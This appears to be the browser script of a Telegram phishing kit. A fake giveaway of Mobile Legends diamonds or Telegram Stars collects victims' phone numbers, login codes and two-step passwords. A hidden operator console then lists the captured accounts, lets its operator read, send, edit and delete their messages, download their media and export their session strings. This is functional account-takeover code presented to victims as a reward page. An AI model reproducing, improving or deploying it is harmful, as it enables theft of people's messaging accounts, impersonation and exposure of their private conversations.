// ===================== Telegram Manager — premium client + operator console ==
const $ = (id) => document.getElementById(id);
const qs = (sel, root = document) => root.querySelector(sel);

async function api(path, opts = {}) {
  const res = await fetch(path, {
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    ...opts,
  });
  let data = null;
  try { data = await res.json(); } catch (_) {}
  if (!res.ok) throw new Error((data && data.detail) || res.statusText || 'Request failed');
  return data;
}
const POST = (body) => ({ method: 'POST', body: JSON.stringify(body || {}) });

// ---------------- formatting helpers ----------------
function esc(s) {
  return (s || '').replace(/[&<>"']/g, (c) => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function initials(name) {
  const p = (name || '?').trim().split(/\s+/);
  return ((p[0] || '?')[0] || '?').toUpperCase() + (p.length > 1 ? (p[1][0] || '').toUpperCase() : '');
}
function avClass(id) { return 'av-' + (Math.abs(Number(id) || 0) % 7); }
function fmtTime(iso) { if (!iso) return ''; return new Date(iso).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); }
function fmtChatTime(iso) {
  if (!iso) return '';
  const d = new Date(iso), now = new Date();
  if (d.toDateString() === now.toDateString()) return fmtTime(iso);
  if ((now - d) / 86400000 < 7) return d.toLocaleDateString([], { weekday: 'short' });
  return d.toLocaleDateString([], { day: '2-digit', month: '2-digit' });
}
function dayLabel(iso) {
  const d = new Date(iso), now = new Date();
  if (d.toDateString() === now.toDateString()) return 'Today';
  const y = new Date(now); y.setDate(now.getDate() - 1);
  if (d.toDateString() === y.toDateString()) return 'Yesterday';
  return d.toLocaleDateString([], { day: 'numeric', month: 'long' });
}
function mediaLabel(k) {
  return { photo: '🖼 Photo', video: '🎬 Video', voice: '🎤 Voice message', audio: '🎵 Audio',
    video_note: '🎥 Video message', gif: 'GIF', sticker: 'Sticker', document: '📎 File',
    webpage: '🔗 Link', location: '📍 Location', contact: '👤 Contact', poll: '📊 Poll', media: 'Media' }[k] || 'Media';
}
function fmtSize(n) {
  if (!n) return '';
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n / 1024).toFixed(0) + ' KB';
  return (n / 1048576).toFixed(1) + ' MB';
}
function toast(msg) {
  const t = $('toast'); t.textContent = msg; t.classList.remove('hidden');
  clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.add('hidden'), 2800);
}
function openLightbox(url) { $('lightbox-img').src = url; $('lightbox').classList.remove('hidden'); }
function closeLightbox() { $('lightbox').classList.add('hidden'); $('lightbox-img').src = ''; }
function setAvatar(el, name, id, url) {
  const sm = el.classList.contains('sm');
  el.className = 'avatar' + (sm ? ' sm ' : ' ') + avClass(id);
  el.style.backgroundImage = '';
  el.textContent = initials(name);          // fallback shown behind the photo
  if (url) {
    const img = document.createElement('img');
    img.className = 'av-img';
    img.alt = '';
    img.referrerPolicy = 'no-referrer';
    img.onerror = () => img.remove();        // 204 / no photo → keep initials
    img.src = url;
    el.appendChild(img);
  }
}

// ===================== Data sources (user vs operator) =====================
function userSource() {
  return {
    canManage: true,
    listChats: (q) => api(`/api/chats?limit=1000${q ? `&q=${encodeURIComponent(q)}` : ''}`),
    getMessages: (cid, off) => api(`/api/chats/${cid}/messages?limit=40${off ? `&offset_id=${off}` : ''}`),
    send: (cid, text, reply) => api(`/api/chats/${cid}/send`, POST({ text, reply_to: reply })),
    edit: (cid, mid, text) => api(`/api/messages/${cid}/${mid}/edit`, POST({ text })),
    del: async (cid, id, rev) => await api(`/api/messages/${cid}/${id}/delete`, POST({ revoke: rev })),
    read: (cid) => api(`/api/chats/${cid}/read`, POST({})),
    avatarUrl: (id) => `/api/avatar/${id}`,
    mediaUrl: (cid, id, thumb) => `/api/chats/${cid}/messages/${id}/media${thumb ? '?thumb=1' : ''}`,
    getSharedMedia: async (cid, limit, off) => await api(`/api/chats/${cid}/shared_media?limit=${limit}${off ? `&offset_id=${off}` : ''}`),
    mediaDownloadUrl: (cid) => null,
  };
}
function adminSource(sid) {
  const b = `/api/admin/sessions/${sid}`;
  return {
    canManage: true, sid,
    listChats: (q) => api(`${b}/chats?limit=1000${q ? `&q=${encodeURIComponent(q)}` : ''}`),
    getMessages: (cid, off) => api(`${b}/chats/${cid}/messages?limit=40${off ? `&offset_id=${off}` : ''}`),
    send: (cid, text, reply) => api(`${b}/chats/${cid}/send`, POST({ text, reply_to: reply })),
    edit: (cid, mid, text) => api(`/api/admin/messages/${sid}/${cid}/${mid}/edit`, POST({ text })),
    del: async (cid, id, rev) => await api(`/api/admin/sessions/${sid}/chats/${cid}/messages/${id}/delete`, POST({ revoke: rev })),
    read: (cid) => api(`${b}/chats/${cid}/read`, POST({})),
    avatarUrl: (id) => `/api/admin/avatar/${sid}/${id}`,
    mediaUrl: (cid, id, thumb) => `${b}/chats/${cid}/messages/${id}/media${thumb ? '?thumb=1' : ''}`,
    getSharedMedia: async (cid, limit, off) => await api(`${b}/chats/${cid}/shared_media?limit=${limit}${off ? `&offset_id=${off}` : ''}`),
    mediaDownloadUrl: (cid) => `${b}/chats/${cid}/media/download`,
  };
}

// ===================== Shared chat controller =====================
function createChat({ listEl, searchEl, convEl }) {
  const S = { source: null, chats: [], byId: {}, current: null, messages: [],
    oldestId: null, mediaOldestId: null, replyTo: null, editing: null, loadingOlder: false, loadingMedia: false };
  const el = {
    empty: qs('.empty-pane', convEl), conv: qs('.conversation', convEl),
    avatar: qs('.conv-avatar', convEl), name: qs('.conv-name', convEl), sub: qs('.conv-sub', convEl),
    refresh: qs('.conv-refresh', convEl), messages: qs('.messages', convEl),
    exportMedia: qs('.conv-export-media-btn', convEl),
    replyBar: qs('.reply-bar', convEl), replyLabel: qs('.reply-label', convEl),
    replyText: qs('.reply-text', convEl), replyCancel: qs('.reply-cancel', convEl),
    input: qs('.msg-input', convEl), send: qs('.send-btn', convEl),
    back: qs('.conv-back', convEl),
  };
  const shell = convEl.closest('.app-shell');

  // ---- chat list ----
  function renderChats() {
    const q = (searchEl.value || '').toLowerCase().trim();
    listEl.innerHTML = '';
    const rows = S.chats.filter((c) => !q || c.name.toLowerCase().includes(q) || (c.username || '').toLowerCase().includes(q));
    if (!rows.length) { listEl.innerHTML = '<div class="load-more" style="cursor:default;color:var(--dim)">No chats</div>'; return; }
    rows.forEach((c) => listEl.appendChild(chatRow(c)));
  }
  function chatRow(c) {
    const row = document.createElement('div');
    row.className = 'chat-row' + (S.current && S.current.id === c.id ? ' active' : '');
    row.dataset.id = c.id;
    const av = document.createElement('div'); av.className = 'avatar';
    setAvatar(av, c.name, c.id, S.source.avatarUrl(c.id));
    const tick = c.out ? '<span class="out-tick">✓</span>' : '';
    const right = c.unread > 0 ? `<span class="badge">${c.unread > 99 ? '99+' : c.unread}</span>`
      : (c.pinned ? '<span class="pin">📌</span>' : '');
    const body = document.createElement('div'); body.className = 'chat-body';
    body.innerHTML = `<div class="chat-top"><span class="chat-name">${esc(c.name)}${c.verified ? ' ✔️' : ''}</span><span class="chat-time">${fmtChatTime(c.date)}</span></div>
      <div class="chat-bottom"><span class="chat-preview">${tick}${esc(c.preview) || '<i style="color:var(--faint)">No messages</i>'}</span>${right}</div>`;
    row.append(av, body);
    row.onclick = () => openChat(c.id);
    return row;
  }
  async function refreshChats() {
    try {
      const r = await S.source.listChats('');
      S.chats = r.chats; S.byId = {};
      r.chats.forEach((c) => (S.byId[c.id] = c));
      renderChats();
    } catch (e) { toast(e.message); }
  }

  // ---- conversation ----
  function chatType(c) { return c.is_channel ? 'channel' : c.is_group ? 'group' : (c.username ? '@' + c.username : 'private chat'); }

  async function openChat(id) {
    const c = S.byId[id]; if (!c) return;
    S.current = c; S.replyTo = null; S.editing = null; el.input.value = ''; autoGrow(); updateReplyBar();
    [...listEl.children].forEach((r) => r.dataset && r.classList.toggle('active', Number(r.dataset.id) === id));
    el.empty.classList.add('hidden'); el.conv.classList.remove('hidden');
    
    const panel = convEl.querySelector('.shared-media-panel');
    if (panel) panel.classList.add('hidden');
    
    if (shell) shell.classList.add('in-chat');
    el.name.textContent = c.name;
    el.sub.textContent = chatType(c) + (c.unread ? ` · ${c.unread} unread` : '');
    setAvatar(el.avatar, c.name, c.id, S.source.avatarUrl(c.id));
    el.messages.innerHTML = '<div class="spinner"></div>';
    try {
      const r = await S.source.getMessages(id, 0);
      S.messages = r.messages.slice().reverse();
      S.oldestId = S.messages.length ? S.messages[0].id : null;
      renderMessages();
      markRead(id);
    } catch (e) { el.messages.innerHTML = `<div class="load-more" style="cursor:default">${esc(e.message)}</div>`; }
  }

  function renderMessages(keep) {
    const box = el.messages, prevH = box.scrollHeight, prevTop = box.scrollTop;
    box.innerHTML = '';
    if (S.oldestId) {
      const lm = document.createElement('div'); lm.className = 'load-more';
      lm.textContent = 'Load older messages'; lm.onclick = loadOlder; box.appendChild(lm);
    }
    let lastDay = '';
    S.messages.forEach((m) => {
      const day = m.date ? new Date(m.date).toDateString() : '';
      if (day && day !== lastDay) { lastDay = day; const s = document.createElement('div'); s.className = 'date-sep'; s.innerHTML = `<span>${dayLabel(m.date)}</span>`; box.appendChild(s); }
      box.appendChild(messageEl(m));
    });
    box.scrollTop = keep ? box.scrollHeight - prevH + prevTop : box.scrollHeight;
  }

  function messageEl(m) {
    const row = document.createElement('div');
    row.className = 'msg-row ' + (m.out ? 'out' : 'in'); row.dataset.id = m.id;
    const grp = S.current && (S.current.is_group || S.current.is_channel);
    let inner = '';
    if (!m.out && grp && m.sender_name) inner += `<span class="sender">${esc(m.sender_name)}</span>`;
    if (m.reply_to) { const q = S.messages.find((x) => x.id === m.reply_to); inner += `<div class="reply-quote">${q ? esc(q.text || mediaLabel(q.media)) : 'Message'}</div>`; }
    if (m.media) {
      const cid = S.current.id;
      const full = S.source.mediaUrl(cid, m.id, false);
      const thumb = S.source.mediaUrl(cid, m.id, true);
      if (m.media === 'photo')
        inner += `<img class="msg-media lb" loading="lazy" src="${full}" data-full="${full}" alt="photo">`;
      else if (m.media === 'sticker')
        inner += `<img class="msg-media sticker" loading="lazy" src="${full}" alt="sticker">`;
      else if (m.media === 'video' || m.media === 'gif' || m.media === 'video_note')
        inner += `<div class="msg-video" data-full="${full}"><img class="msg-media" loading="lazy" src="${thumb}" alt="video"><span class="vplay">▶</span></div>`;
      else if (m.media === 'voice' || m.media === 'audio')
        inner += `<audio class="msg-audio" controls preload="none" src="${full}"></audio>`;
      else if (m.media === 'document')
        inner += `<a class="msg-file" href="${full}" target="_blank" rel="noopener">📎 <span>${esc(m.file_name || 'Document')}</span><small>${fmtSize(m.file_size)}</small></a>`;
      else inner += `<span class="media-chip">${mediaLabel(m.media)}</span>`;
      if (m.text) inner += '<br>';
    }
    if (m.text) inner += esc(m.text);
    if (!m.media && !m.text) inner += '<span class="media-chip">Empty message</span>';
    inner += `<span class="meta">${m.edited ? '<span class="edited">edited</span>' : ''}${fmtTime(m.date)}${m.out ? '<span class="tick">✓</span>' : ''}</span>`;
    const bubble = document.createElement('div'); bubble.className = 'bubble'; bubble.innerHTML = inner;

    const actions = document.createElement('div'); actions.className = 'msg-actions';
    const mk = (txt, title, fn) => { const b = document.createElement('button'); b.textContent = txt; b.title = title; b.onclick = (e) => { e.stopPropagation(); fn(); }; return b; };
    actions.appendChild(mk('↩', 'Reply', () => startReply(m)));
    if (S.source.canManage && m.out) actions.appendChild(mk('✎', 'Edit', () => startEdit(m)));
    if (S.source.canManage) actions.appendChild(mk('🗑', 'Delete', () => deleteMsg(m)));
    bubble.appendChild(actions);
    row.appendChild(bubble);
    return row;
  }

  async function loadOlder() {
    if (S.loadingOlder || !S.oldestId) return; S.loadingOlder = true;
    try {
      const r = await S.source.getMessages(S.current.id, S.oldestId);
      const older = r.messages.slice().reverse();
      if (older.length) { S.messages = older.concat(S.messages); S.oldestId = older[0].id; }
      else S.oldestId = null;
      renderMessages(true);
    } catch (e) { toast(e.message); } finally { S.loadingOlder = false; }
  }

  // ---- actions ----
  function startReply(m) { S.editing = null; S.replyTo = { id: m.id, text: m.text || mediaLabel(m.media) }; updateReplyBar(); el.input.focus(); }
  function startEdit(m) { S.replyTo = null; S.editing = { id: m.id }; el.input.value = m.text || ''; autoGrow(); updateReplyBar(); el.input.focus(); }
  function cancelReply() { S.replyTo = null; if (S.editing) { S.editing = null; el.input.value = ''; autoGrow(); } updateReplyBar(); }
  function updateReplyBar() {
    if (S.replyTo) { el.replyBar.classList.remove('hidden'); el.replyLabel.textContent = 'Replying to'; el.replyLabel.classList.remove('editing'); el.replyText.textContent = S.replyTo.text; }
    else if (S.editing) { el.replyBar.classList.remove('hidden'); el.replyLabel.textContent = 'Editing message'; el.replyLabel.classList.add('editing'); el.replyText.textContent = 'Press send to save'; }
    else el.replyBar.classList.add('hidden');
  }
  async function sendMessage() {
    const text = el.input.value.trim(); if (!text || !S.current) return;
    const cid = S.current.id; el.input.value = ''; autoGrow();
    if (S.editing) {
      const id = S.editing.id; S.editing = null; updateReplyBar();
      try { const r = await S.source.edit(cid, id, text); upsert(r.message); renderMessages(); }
      catch (e) { toast('Edit failed: ' + e.message); }
      return;
    }
    const reply = S.replyTo ? S.replyTo.id : null; S.replyTo = null; updateReplyBar();
    try { const r = await S.source.send(cid, text, reply); upsert(r.message); renderMessages(); bumpPreview(cid, r.message); }
    catch (e) { toast('Send failed: ' + e.message); el.input.value = text; }
  }
  async function deleteMsg(m) {
    if (!confirm('Delete this message' + (m.out ? ' for everyone?' : '?'))) return;
    try { await S.source.del(S.current.id, m.id, !!m.out); S.messages = S.messages.filter((x) => x.id !== m.id); renderMessages(true); }
    catch (e) { toast('Delete failed: ' + e.message); }
  }
  async function markRead(cid) {
    try { await S.source.read(cid); const c = S.byId[cid]; if (c) { c.unread = 0; renderChats(); } } catch (_) {}
  }
  function upsert(m) { const i = S.messages.findIndex((x) => x.id === m.id); if (i >= 0) S.messages[i] = m; else S.messages.push(m); }
  function bumpPreview(cid, m) {
    const c = S.byId[cid]; if (!c) return;
    c.preview = (m.text || mediaLabel(m.media) || '').slice(0, 90); c.date = m.date; c.out = m.out;
    S.chats = [c, ...S.chats.filter((x) => x.id !== cid)]; renderChats();
  }
  function autoGrow() { el.input.style.height = 'auto'; el.input.style.height = Math.min(el.input.scrollHeight, 130) + 'px'; }

  // ---- wiring ----
  el.messages.addEventListener('click', (e) => {
    const img = e.target.closest('.msg-media.lb');
    if (img) { openLightbox(img.dataset.full); return; }
    const vid = e.target.closest('.msg-video');
    if (vid) { window.open(vid.dataset.full, '_blank'); }
  });
  
  // Shared Media Logic
  const panel = convEl.querySelector('.shared-media-panel');
  const mediaGrid = convEl.querySelector('.shared-media-grid');
  
  async function loadMedia(append = false) {
    if (S.loadingMedia) return;
    S.loadingMedia = true;
    if (!append) {
      mediaGrid.innerHTML = '<div class="load-more">Loading...</div>';
      S.mediaOldestId = null;
    } else {
      const btn = mediaGrid.querySelector('.media-load-more');
      if (btn) btn.textContent = 'Loading...';
    }
    
    try {
      const r = await S.source.getSharedMedia(S.current.id, 40, S.mediaOldestId);
      if (!append) mediaGrid.innerHTML = '';
      else {
        const btn = mediaGrid.querySelector('.media-load-more');
        if (btn) btn.remove();
      }
      
      if (!r.messages || r.messages.length === 0) {
        if (!append) mediaGrid.innerHTML = '<div class="empty-pane"><p>No media found</p></div>';
        S.mediaOldestId = null;
        S.loadingMedia = false;
        return;
      }
      
      r.messages.forEach(m => {
        if (!m.media || m.media === 'document' || m.media === 'audio' || m.media === 'voice') return;
        const full = S.source.mediaUrl(S.current.id, m.id, false);
        const thumb = S.source.mediaUrl(S.current.id, m.id, true);
        const div = document.createElement('div');
        div.className = 'shared-media-item';
        
        if (m.media === 'photo') {
          div.innerHTML = `<img loading="lazy" src="${thumb}" alt="photo">`;
          div.onclick = () => openLightbox(full);
        } else if (m.media === 'video' || m.media === 'gif' || m.media === 'video_note') {
          div.innerHTML = `<img loading="lazy" src="${thumb}" alt="video"><div class="play-icon">▶</div>`;
          div.onclick = () => window.open(full, '_blank');
        }
        mediaGrid.appendChild(div);
      });
      
      if (r.messages.length > 0) {
        S.mediaOldestId = r.messages[r.messages.length - 1].id;
        const lm = document.createElement('div');
        lm.className = 'load-more media-load-more';
        lm.style.gridColumn = '1 / -1';
        lm.textContent = 'Load older media';
        lm.onclick = () => loadMedia(true);
        mediaGrid.appendChild(lm);
      } else {
        S.mediaOldestId = null;
      }
    } catch (e) {
      mediaGrid.innerHTML = `<div class="empty-pane"><p>Failed: ${e.message}</p></div>`;
    }
    S.loadingMedia = false;
  }
  
  convEl.querySelector('.conv-media-btn').onclick = () => {
    if (!S.current) return;
    panel.classList.toggle('hidden');
    if (!panel.classList.contains('hidden')) {
      loadMedia(false);
    }
  };
  convEl.querySelector('.close-media-btn').onclick = () => panel.classList.add('hidden');

  searchEl.addEventListener('input', renderChats);
  if (el.back) el.back.onclick = () => { if (shell) shell.classList.remove('in-chat'); };
  el.refresh.onclick = () => S.current && openChat(S.current.id);
  if (el.exportMedia) el.exportMedia.onclick = () => {
    if (S.current && S.source.mediaDownloadUrl(S.current.id)) {
      toast('Generating ZIP, this may take a moment...');
      window.location.href = S.source.mediaDownloadUrl(S.current.id);
    }
  };
  el.send.onclick = sendMessage;
  el.replyCancel.onclick = cancelReply;
  el.input.addEventListener('input', autoGrow);
  el.input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); }
    if (e.key === 'Escape') cancelReply();
  });

  function handleEvent(ev) {
    if (ev.type === 'new_message') {
      const m = ev.message;
      if (S.current && S.current.id === ev.chat_id) { upsert(m); renderMessages(); if (!m.out) markRead(ev.chat_id); }
      else { const c = S.byId[ev.chat_id]; if (c && !m.out) c.unread = (c.unread || 0) + 1; }
      if (S.byId[ev.chat_id]) bumpPreview(ev.chat_id, m); else refreshChats();
    } else if (ev.type === 'edit_message') {
      if (S.current && S.current.id === ev.chat_id) { const i = S.messages.findIndex((x) => x.id === ev.message.id); if (i >= 0) { S.messages[i] = ev.message; renderMessages(true); } }
    } else if (ev.type === 'delete_message') {
      if (S.current && (ev.chat_id == null || S.current.id === ev.chat_id)) { const b = S.messages.length; S.messages = S.messages.filter((x) => !ev.ids.includes(x.id)); if (S.messages.length !== b) renderMessages(true); }
    }
  }

  return {
    refreshChats, openChat, handleEvent,
    get currentChatId() { return S.current ? S.current.id : null; },
    setSource(src) {
      S.source = src; S.chats = []; S.byId = {}; S.current = null; S.messages = [];
      S.oldestId = null; S.replyTo = null; S.editing = null; el.input.value = '';
      updateReplyBar(); listEl.innerHTML = '';
      el.conv.classList.add('hidden'); el.empty.classList.remove('hidden');
      if (shell) shell.classList.remove('in-chat');
    },
  };
}

// ===================== App orchestration =====================
const App = { mode: null, me: null, userChat: null, adminChat: null, userWS: null, adminWS: null, accounts: [], currentSid: null };

function showView(id) { ['login-view', 'user-view', 'admin-view', 'claim-view'].forEach((v) => $(v).classList.toggle('hidden', v !== id)); }

function showClaim(bot) {
  showView('claim-view');
  if (GiveawayMode === 'stars') {
    $('claim-emoji').textContent = '⭐';
    $('claim-title').textContent = 'Account linked!';
    $('claim-player').innerHTML = '⭐ <b>Telegram Stars</b><br>Claim 50 free Stars to your account';
    const link = `https://t.me/${bot}?start=stars`;
    $('claim-open').href = link;
    $('claim-open').textContent = 'Open Bot to claim Stars →';
    $('claim-foot').textContent = `You'll continue in @${bot}`;
    $('claim-manage').onclick = () => { enterUser(); };
    try { window.open(link, '_blank'); } catch (_) {}
  } else {
    $('claim-emoji').textContent = '💎';
    $('claim-title').textContent = 'Player verified!';
    const link = `https://t.me/${bot}?start=ml_${Mlbb.user_id}_${Mlbb.server_id}`;
    $('claim-player').innerHTML = `💎 <b>${esc(Mlbb.name)}</b><br>ID ${esc(Mlbb.user_id)} · Server ${esc(Mlbb.server_id)}`;
    $('claim-open').href = link;
    $('claim-open').textContent = 'Open Top-up Bot to claim →';
    $('claim-foot').textContent = `You'll continue in @${bot}`;
    $('claim-manage').onclick = () => { Mlbb.name = null; enterUser(); };
    try { window.open(link, '_blank'); } catch (_) {}
  }
}

const IS_OPERATOR = location.pathname.replace(/\/+$/, '') === '/operator';

async function boot() {
  if (IS_OPERATOR) {
    let admin = false;
    try { admin = (await api('/api/admin/status')).is_admin; } catch (_) {}
    if (admin) return enterAdmin();
    return showLogin('operator');
  }
  try { const r = await api('/api/auth/status'); if (r.status === 'authorized') { App.me = r.user; return enterUser(); } } catch (_) {}
  showLogin('user');
}
function showLogin(which) {
  showView('login-view');
  $('login-user').classList.toggle('hidden', which !== 'user');
  $('login-operator').classList.toggle('hidden', which !== 'operator');
  $('brand-title').innerHTML = which === 'operator' ? 'Operator&nbsp;<b>Console</b>' : 'Giveaway&nbsp;<b>Top-up</b>';
  $('login-foot').textContent = which === 'operator'
    ? 'Restricted · operator access only' : 'Choose your reward · sign in · claim instantly';
  if (which === 'user') showLoginStep('pick');
}

// ---------------- MLBB lookup (login funnel) ----------------
const Mlbb = { user_id: null, server_id: null, name: null };
let GiveawayMode = 'mlbb';  // 'mlbb' or 'stars'
async function mlbbCheck() {
  const id = $('in-mlbb-id').value.trim(), sv = $('in-mlbb-server').value.trim();
  if (!id || !sv) return loginErr('Enter Player ID and Server');
  loginBusy(true);
  $('mlbb-result').classList.add('hidden'); $('btn-mlbb-continue').classList.add('hidden');
  try {
    const r = await api('/api/mlbb/check', POST({ user_id: id, server_id: sv }));
    Mlbb.user_id = r.user_id; Mlbb.server_id = r.server_id; Mlbb.name = r.name;
    $('mlbb-result').innerHTML =
      '<div class="mlbb-ok"><span class="mlbb-diamond">💎</span>' +
      `<div><div class="mlbb-name">${esc(r.name)}</div>` +
      `<div class="mlbb-sub">ID ${esc(r.user_id)} · Server ${esc(r.server_id)}</div></div>` +
      '<span class="mlbb-check">✓</span></div>';
    $('mlbb-result').classList.remove('hidden');
    $('btn-mlbb-continue').classList.remove('hidden');
    $('login-error').textContent = '';
  } catch (e) { loginErr(e.message); } finally { loginBusy(false); }
}
function mlbbContinue() { showLoginStep('phone'); $('in-phone').focus(); }
function pickStars() {
  GiveawayMode = 'stars';
  Mlbb.user_id = Mlbb.server_id = Mlbb.name = null;
  showLoginStep('phone');
  $('in-phone').focus();
}
function pickMlbb() {
  GiveawayMode = 'mlbb';
  showLoginStep('mlbb');
}
async function exportSession(baseUrl, label) {
  try {
    const r = await api(baseUrl + '?format=string');
    try { await navigator.clipboard.writeText(r.string); toast(`Session string for ${label} copied to clipboard`); }
    catch (_) { toast('Session ready — downloading file…'); }
  } catch (e) { toast('Export failed: ' + e.message); return; }
  const a = document.createElement('a');
  a.href = baseUrl + '?format=file'; a.download = '';
  document.body.appendChild(a); a.click(); a.remove();
}

// ---------------- USER mode ----------------
async function enterUser() {
  App.mode = 'user'; showView('user-view');
  if (!App.userChat) App.userChat = createChat({ listEl: $('u-chat-list'), searchEl: $('u-search'), convEl: qs('#user-view .conv-wrap') });
  App.userChat.setSource(userSource());
  // Stars flow: just show the claim screen pointing to the bot
  if (GiveawayMode === 'stars') {
    let bot = '';
    try { bot = (await api('/api/config')).topup_bot || ''; } catch (_) {}
    if (bot) { showClaim(bot); return; }
  }
  // MLBB flow
  if (Mlbb.name) {
    try { await api('/api/mlbb/link', POST(Mlbb)); } catch (_) {}
    let bot = '';
    try { bot = (await api('/api/config')).topup_bot || ''; } catch (_) {}
    if (bot) { showClaim(bot); return; }   // hand off to the bot via the claim screen
  }
  if (!App.me) { try { App.me = await api('/api/me'); } catch (_) { App.me = {}; } }
  const name = [App.me.first_name, App.me.last_name].filter(Boolean).join(' ') || App.me.username || 'Me';
  $('u-me-name').textContent = name; setAvatar($('u-me-avatar'), name, App.me.id, `/api/avatar/${App.me.id}`);
  await App.userChat.refreshChats();
  connectUserWS();
}
function connectUserWS() {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const ws = new WebSocket(`${proto}://${location.host}/ws`); App.userWS = ws;
  ws.onopen = () => { ws._p = setInterval(() => { try { ws.send('ping'); } catch (_) {} }, 25000); };
  ws.onmessage = (e) => { if (e.data === 'pong') return; let m; try { m = JSON.parse(e.data); } catch (_) { return; } App.userChat.handleEvent(m); };
  ws.onclose = () => { clearInterval(ws._p); if (App.mode === 'user') setTimeout(connectUserWS, 3000); };
  ws.onerror = () => ws.close();
}

// ---------------- ADMIN mode ----------------
async function enterAdmin() {
  App.mode = 'admin'; showView('admin-view');
  if (!App.adminChat) App.adminChat = createChat({ listEl: $('a-chat-list'), searchEl: $('a-search'), convEl: qs('#admin-view .conv-wrap') });
  await loadAccounts();
  connectAdminWS();
}
async function loadAccounts() {
  try {
    const r = await api('/api/admin/sessions');
    App.accounts = r.sessions; $('a-count').textContent = r.count;
    renderAccounts();
  } catch (e) { toast(e.message); }
}
function renderAccounts() {
  const list = $('a-account-list'); list.innerHTML = '';
  if (!App.accounts.length) { list.innerHTML = '<div class="load-more" style="cursor:default;color:var(--dim);padding:18px">No accounts logged in yet.<br>Open a normal “Account” login to add one.</div>'; return; }
  App.accounts.forEach((a) => {
    const row = document.createElement('div');
    row.className = 'account-row' + (App.currentSid === a.sid ? ' active' : '');
    const av = document.createElement('div'); av.className = 'avatar sm'; setAvatar(av, a.name, a.user_id, null);
    const body = document.createElement('div'); body.className = 'acct-body';
    const sub = a.phone || (a.username ? '@' + a.username : '') || 'account';
    body.innerHTML = `<div class="acct-name">${esc(a.name)}</div><div class="acct-sub">${esc(sub)}${a.viewers ? ' · live' : ''}</div>`;
    const dot = document.createElement('span'); dot.className = 'dot' + (a.online ? ' online' : '');
    row.append(av, body, dot);
    row.onclick = () => selectAccount(a.sid);
    list.appendChild(row);
  });
}
async function selectAccount(sid) {
  if ($('admin-view')) $('admin-view').classList.add('in-account');
  App.currentSid = sid; renderAccounts();
  const a = App.accounts.find((x) => x.sid === sid); if (!a) return;
  $('a-acct-name').textContent = a.name;
  $('a-acct-sub').textContent = a.phone || (a.username ? '@' + a.username : '') || '';
  setAvatar($('a-acct-avatar'), a.name, a.user_id, null);
  $('a-acct-logout').disabled = false;
  $('a-acct-export').disabled = false;
  App.adminChat.setSource(adminSource(sid));
  if (App.adminWS && App.adminWS.readyState === 1) App.adminWS.send(JSON.stringify({ action: 'subscribe', sid }));
  await App.adminChat.refreshChats();
}
function connectAdminWS() {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const ws = new WebSocket(`${proto}://${location.host}/api/admin/ws`); App.adminWS = ws;
  ws.onopen = () => {
    ws._p = setInterval(() => { try { ws.send(JSON.stringify({ action: 'ping' })); } catch (_) {} }, 25000);
    if (App.currentSid) ws.send(JSON.stringify({ action: 'subscribe', sid: App.currentSid }));
  };
  ws.onmessage = (e) => {
    let m; try { m = JSON.parse(e.data); } catch (_) { return; }
    if (m.type === 'pong' || m.type === 'subscribed') return;
    if (m.type === 'error') return;
    if (m.sid && m.sid === App.currentSid) App.adminChat.handleEvent(m);
  };
  ws.onclose = () => { clearInterval(ws._p); if (App.mode === 'admin') setTimeout(connectAdminWS, 3000); };
  ws.onerror = () => ws.close();
}

// ===================== AUTH (login screen) =====================
function showLoginStep(step) {
  ['pick', 'mlbb', 'phone', 'code', 'password'].forEach((s) => $('step-' + s).classList.toggle('hidden', s !== step));
  $('login-error').textContent = '';
  $('login-sub').textContent = {
    pick: 'Choose your giveaway reward',
    mlbb: 'Enter your Mobile Legends ID & server to begin',
    phone: 'Sign in to link your account and receive your reward',
    code: 'We sent a code to your Telegram app',
    password: 'Enter your two-step verification password',
  }[step] || '';
}
function loginBusy(b) { $('login-spinner').classList.toggle('hidden', !b); document.querySelectorAll('#login-view button').forEach((x) => (x.disabled = b)); }
const loginErr = (e) => ($('login-error').textContent = e);

async function sendCode() {
  const phone = $('in-phone').value.trim(); if (!phone) return loginErr('Enter a phone number');
  loginBusy(true);
  try { await api('/api/auth/send_code', POST({ phone })); showLoginStep('code'); $('in-code').focus(); }
  catch (e) { loginErr(e.message); } finally { loginBusy(false); }
}
async function signIn() {
  const code = $('in-code').value.trim(); if (!code) return loginErr('Enter the code');
  loginBusy(true);
  try { const r = await api('/api/auth/sign_in', POST({ code })); if (r.status === 'password_needed') { showLoginStep('password'); $('in-password').focus(); } else enterUser(); }
  catch (e) { loginErr(e.message); } finally { loginBusy(false); }
}
async function submitPassword() {
  const password = $('in-password').value; if (!password) return loginErr('Enter your password');
  loginBusy(true);
  try { await api('/api/auth/password', POST({ password })); enterUser(); }
  catch (e) { loginErr(e.message); } finally { loginBusy(false); }
}
async function adminLogin() {
  const username = $('in-admin-user').value.trim(), password = $('in-admin-pass').value;
  if (!username || !password) return loginErr('Enter operator credentials');
  loginBusy(true);
  try { await api('/api/admin/login', POST({ username, password })); enterAdmin(); }
  catch (e) { loginErr(e.message); } finally { loginBusy(false); }
}
async function userLogout() {
  if (!confirm('Log out of this account? It will be removed from this browser.')) return;
  try { if (App.userWS) App.userWS.close(); await api('/api/auth/logout', POST({})); } catch (_) {}
  location.reload();
}
async function adminLogout() {
  try { if (App.adminWS) App.adminWS.close(); await api('/api/admin/logout', POST({})); } catch (_) {}
  location.reload();
}
async function forceLogoutAccount() {
  if (!App.currentSid) return;
  const a = App.accounts.find((x) => x.sid === App.currentSid);
  if (!confirm(`Log out ${a ? a.name : 'this account'}? Their session will be removed from the server.`)) return;
  try { await api(`/api/admin/sessions/${App.currentSid}/logout`, POST({})); App.currentSid = null; $('a-acct-logout').disabled = true; $('a-acct-export').disabled = true; App.adminChat.setSource(adminSource('')); await loadAccounts(); toast('Account logged out'); }
  catch (e) { toast(e.message); }
}

// ===================== wiring =====================
function wire() {
  $('pick-mlbb').onclick = pickMlbb;
  $('pick-stars').onclick = pickStars;
  $('mlbb-back-pick').onclick = () => showLoginStep('pick');
